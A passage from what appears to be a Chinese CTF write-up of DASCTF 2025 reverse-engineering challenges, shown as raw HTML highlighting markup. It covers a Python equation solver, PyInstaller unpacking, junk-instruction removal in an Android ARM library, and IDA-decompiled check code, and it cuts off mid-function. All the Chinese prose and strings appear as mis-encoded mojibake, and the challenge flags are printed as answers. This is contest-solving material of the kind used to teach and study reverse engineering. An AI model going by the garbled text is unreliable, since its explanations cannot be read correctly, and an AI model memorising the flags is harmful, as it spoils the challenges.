</span></span><span class=line><span class=cl>                   <span class=p>([</span><span class=mi>70</span><span class=p>,</span> <span class=mi>170</span><span class=p>,</span> <span class=mi>164</span><span class=p>,</span> <span class=mi>193</span><span class=p>],</span> <span class=mi>92711</span><span class=p>),</span> <span class=p>([</span><span class=mi>96</span><span class=p>,</span> <span class=mi>198</span><span class=p>,</span> <span class=mi>95</span><span class=p>,</span> <span class=mi>1</span><span class=p>],</span> <span class=mi>61904</span><span class=p>)]},</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=s1>&#39;equations&#39;</span><span class=p>:</span> <span class=p>[([</span><span class=mi>114</span><span class=p>,</span> <span class=mi>179</span><span class=p>,</span> <span class=mi>37</span><span class=p>,</span> <span class=mi>163</span><span class=p>],</span> <span class=mi>53864</span><span class=p>),</span> <span class=p>([</span><span class=mi>49</span><span class=p>,</span> <span class=mi>94</span><span class=p>,</span> <span class=mi>132</span><span class=p>,</span> <span class=mi>99</span><span class=p>],</span> <span class=mi>36980</span><span class=p>),</span>
</span></span><span class=line><span class=cl>                   <span class=p>([</span><span class=mi>1</span><span class=p>,</span> <span class=mi>139</span><span class=p>,</span> <span class=mi>115</span><span class=p>,</span> <span class=mi>44</span><span class=p>],</span> <span class=mi>22448</span><span class=p>),</span> <span class=p>([</span><span class=mi>43</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>150</span><span class=p>,</span> <span class=mi>128</span><span class=p>],</span> <span class=mi>40829</span><span class=p>)]},</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>all_solutions</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>group</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>groups</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sols</span> <span class=o>=</span> <span class=n>solve_group</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>group</span><span class=p>[</span><span class=s1>&#39;equations&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>sols</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ç¬¬ </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2> ç»„æ— è§£&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ç¬¬ </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2> ç»„æ‰¾åˆ° </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>sols</span><span class=p>)</span><span class=si>}</span><span class=s2> ä¸ªè§£&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>all_solutions</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>sols</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>full_solutions</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>itertools</span><span class=o>.</span><span class=n>product</span><span class=p>(</span><span class=o>*</span><span class=n>all_solutions</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>æ€»å…±ç»„åˆå‡º </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>full_solutions</span><span class=p>)</span><span class=si>}</span><span class=s2> ä¸ªå®Œæ•´è§£&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>sol</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>full_solutions</span><span class=p>,</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>flat</span> <span class=o>=</span> <span class=p>[</span><span class=n>v</span> <span class=k>for</span> <span class=n>group</span> <span class=ow>in</span> <span class=n>sol</span> <span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>group</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>è§£ </span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s2>:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>line</span> <span class=o>=</span> <span class=s1>&#39; &#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>flat</span><span class=p>[</span><span class=n>j</span><span class=p>]</span><span class=si>:</span><span class=s2>3d</span><span class=si>}</span><span class=s2>&#34;</span> <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  </span><span class=si>{</span><span class=n>line</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>hex_line</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>b</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2>&#34;</span> <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>flat</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>hex_line</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°ï¼š1d7fea8e9b8991f350e69118d732b3fc49c12679a87162f6a1d42dc5e43b5956</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/18193d0b-9fd9-4ec0-97e1-a2cd1c284fc3.png alt=img></p><p>çŒœæµ‹æ˜¯çœŸæ­£çš„å¯†æ–‡ï¼Œå°è¯•è§£å¯†</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/52464938-efca-4ecb-926e-459e1644ac83.png alt=img></p><p>è§£å¾—flagï¼Œflagä¸ºï¼šDASCTF{9d78b5507187421a48de8f6ef24a8d4b}</p><h2 id=é±¼éŸ³ä¹>é±¼éŸ³ä¹</h2><p>exeå¾ˆæ˜æ˜¾pyinstalleræ‰“åŒ…çš„ï¼Œè§£åŒ…æ‰¾åˆ°main.pycå’Œxianyu_decrypt.cp38-win_amd64.pydï¼Œpylingualåç¼–è¯‘pycå¯çŸ¥æ˜¯python3.8</p><p>æ ¸å¿ƒä»£ç å¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>info</span> <span class=o>=</span> <span class=n>load_and_decrypt_xianyu</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>meta</span> <span class=o>=</span> <span class=n>info</span><span class=p>[</span><span class=s1>&#39;meta&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>cover_path</span> <span class=o>=</span> <span class=n>info</span><span class=p>[</span><span class=s1>&#39;cover_path&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>audio_path</span> <span class=o>=</span> <span class=n>info</span><span class=p>[</span><span class=s1>&#39;audio_path&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>cover_path</span> <span class=ow>and</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>cover_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pixmap</span> <span class=o>=</span> <span class=n>QPixmap</span><span class=p>(</span><span class=n>cover_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>cover_label</span><span class=o>.</span><span class=n>setPixmap</span><span class=p>(</span><span class=n>pixmap</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>cover_label</span><span class=o>.</span><span class=n>setText</span><span class=p>(</span><span class=s1>&#39;æ— å°é¢&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=n>QUrl</span><span class=o>.</span><span class=n>fromLocalFile</span><span class=p>(</span><span class=n>audio_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=bp>self</span><span class=o>.</span><span class=n>player</span><span class=o>.</span><span class=n>setMedia</span><span class=p>(</span><span class=n>QMediaContent</span><span class=p>(</span><span class=n>url</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=bp>self</span><span class=o>.</span><span class=n>player</span><span class=o>.</span><span class=n>play</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>name</span> <span class=o>=</span> <span class=n>meta</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>,</span> <span class=s1>&#39;æœªçŸ¥&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>artist</span> <span class=o>=</span> <span class=n>meta</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;artist&#39;</span><span class=p>,</span> <span class=s1>&#39;æœªçŸ¥æ­Œæ‰‹&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fl4g</span> <span class=o>=</span> <span class=n>meta</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;fl4g&#39;</span><span class=p>,</span> <span class=s1>&#39;where_is_the_flag?&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>æŠŠpydæ‹¿è¿‡æ¥å’Œmainã€xianyuåç¼€æ–‡ä»¶æ”¾åŒä¸€ç›®å½•åŠ¨æ€è°ƒè¯•å³å¯å¾—åˆ°flag</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/e96f1a83-4c5a-4528-ae97-133dfd00956b.png alt=img></p><p>flagæ˜¯DASCTF{fl5h_mus1c_miao_m1a0_mlaO}</p><h2 id=æ›´é€‚åˆctfå®å®ä½“è´¨çš„app>æ›´é€‚åˆCTFå®å®ä½“è´¨çš„app</h2><p>javaå±‚æ˜¯å‡çš„flagï¼ˆteaåŠ å¯†ï¼‰</p><p>soå±‚åˆ†æåå‘ç°è¿˜æ˜¯armå¥½è¯»ï¼Œé‡Œé¢æœ‰å‡ ä¸ªå‡½æ•°å¼€å¤´æœ‰èŠ±æŒ‡ä»¤</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/ade9d6f8-05b9-45bf-95f7-111d4196fdfb.png alt=img></p><p>åˆ†æå¯ä»¥å‘ç°åœ¨è·³è½¬BR X8åçš„ä»£ç åæ±‡ç¼–å¤±è´¥ï¼Œåˆ†æX8å€¼ï¼Œé¦–å…ˆæ˜¯X8=(1^0xAB^0xC7)-0x6C=1ï¼Œç„¶åX8=X9+X12*X8=0x4028+0x14=0x403Cï¼Œæ‰€ä»¥å®é™…ä¸Šå®ç°äº†ä¸€ä¸ªè®¡ç®—è·³è½¬åœ°å€ï¼Œä¸­é—´æ‰€æœ‰çš„éƒ½æ˜¯èŠ±æŒ‡ä»¤ï¼Œç›´æ¥IDA nopå³å¯</p><p>å»èŠ±åå¯ä»¥åç¼–è¯‘ï¼Œæ ¹æ®JNI_OnLoadæ‰¾åˆ°Checkå‡½æ•°å¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>bool</span> <span class=kr>__fastcall</span> <span class=nf>sub_3A9C</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>_BOOL4</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [xsp+3Ch] [xbp-144h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_OWORD</span> <span class=n>v4</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span> <span class=c1>// [xsp+40h] [xbp-140h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_BYTE</span> <span class=n>v5</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span> <span class=c1>// [xsp+60h] [xbp-120h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_OWORD</span> <span class=n>s1</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span> <span class=c1>// [xsp+150h] [xbp-30h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// [xsp+178h] [xbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_ReadStatusReg</span><span class=p>(</span><span class=n>ARM64_SYSREG</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span> <span class=o>+</span> <span class=mi>40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>s1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>xmmword_D84</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>s1</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>xmmword_D74</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>v4</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>v4</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>sub_3FD0</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sub_3FD0</span><span class=p>(</span><span class=n>a1</span> <span class=o>+</span> <span class=mi>16</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v5</span><span class=p>[</span><span class=mi>16</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=n>sub_37F0</span><span class=p>(</span><span class=n>v5</span><span class=p>,</span> <span class=n>v4</span><span class=p>,</span> <span class=mh>0x20uLL</span><span class=p>,</span> <span class=mh>0x6C6F7665</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=n>memcmp</span><span class=p>(</span><span class=n>s1</span><span class=p>,</span> <span class=n>v4</span><span class=p>,</span> <span class=mh>0x20uLL</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>_ReadStatusReg</span><span class=p>(</span><span class=n>ARM64_SYSREG</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v3</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_3FD0</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#34;+&#34; TO EXPAND]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v17</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_ReadStatusReg</span><span class=p>(</span><span class=n>ARM64_SYSREG</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>))</span> <span class=o>+</span> <span class=mi>40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>v16</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>v16</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>v15</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>v15</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>s</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>__memcpy_chk</span><span class=p>(</span><span class=n>v16</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>unk_6FA4</span><span class=p>,</span> <span class=mi>163840LL</span><span class=p>,</span> <span class=mi>163840LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__memcpy_chk</span><span class=p>(</span><span class=n>v15</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>unk_2EFA4</span><span class=p>,</span> <span class=mi>4096LL</span><span class=p>,</span> <span class=mi>4096LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__memcpy_chk</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>unk_2FFA4</span><span class=p>,</span> <span class=mi>221184LL</span><span class=p>,</span> <span class=mi>221184LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>__memcpy_chk</span><span class=p>(</span><span class=n>v13</span><span class=p>,</span> <span class=n>a1</span><span class=p>,</span> <span class=mi>16LL</span><span class=p>,</span> <span class=mi>16LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>8</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>shift</span><span class=p>(</span><span class=n>v13</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;=</span> <span class=mi>3</span><span class=p>;</span> <span class=o>++</span><span class=n>j</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v8</span> <span class=o>=</span> <span class=o>*&amp;</span><span class=n>v16</span><span class=p>[</span><span class=mh>0x4000</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1024</span> <span class=o>*</span> <span class=p>(</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>v13</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>      <span class=n>v7</span> <span class=o>=</span> <span class=o>*&amp;</span><span class=n>v16</span><span class=p>[</span><span class=mh>0x4000</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1024</span> <span class=o>*</span> <span class=p>((</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>v13</span><span class=p>[(</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=mi>1</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>      <span class=n>v6</span> <span class=o>=</span> <span class=o>*&amp;</span><span class=n>v16</span><span class=p>[</span><span class=mh>0x4000</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1024</span> <span class=o>*</span> <span class=p>((</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>v13</span><span class=p>[(</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=mi>2</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>      <span class=n>v5</span> <span class=o>=</span> <span class=o>*&amp;</span><span class=n>v16</span><span class=p>[</span><span class=mh>0x4000</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1024</span> <span class=o>*</span> <span class=p>((</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>v13</span><span class=p>[(</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>|</span> <span class=mi>3</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>      <span class=n>v4</span> <span class=o>=</span> <span class=mi>24</span> <span class=o>*</span> <span class=n>j</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v13</span><span class=p>[</span><span class=mi>4</span> <span class=o>*</span> <span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>                      <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                      <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>HIBYTE</span><span class=p>(</span><span class=n>v8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>HIBYTE</span><span class=p>(</span><span class=n>v7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>                   <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>HIBYTE</span><span class=p>(</span><span class=n>v6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>HIBYTE</span><span class=p>(</span><span class=n>v5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)))</span> <span class=o>|</span> <span class=p>(</span><span class=mi>16</span> <span class=o>*</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s</span><span class=p>[</span><span class=mi>1536</span> <span class=o>*</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>16</span> <span class=o>*</span> <span class=p>(</span><span class=mi>24</span> <span class=o>*</span> <span class=n>j</span><span class=p>)</span> <span class=o>+</span> <span class=p>(</span><span class=n>v8</span> <span class=o>&gt;&gt;</span> <span class=mi>28</span><span class=p>)]</span> <span class=o>+</span> <span class=p>(</span><span class=n>v7</span> <span class=o>&gt;&gt;</span> <span class=mi>28</span><span class=p>))]</span> <span 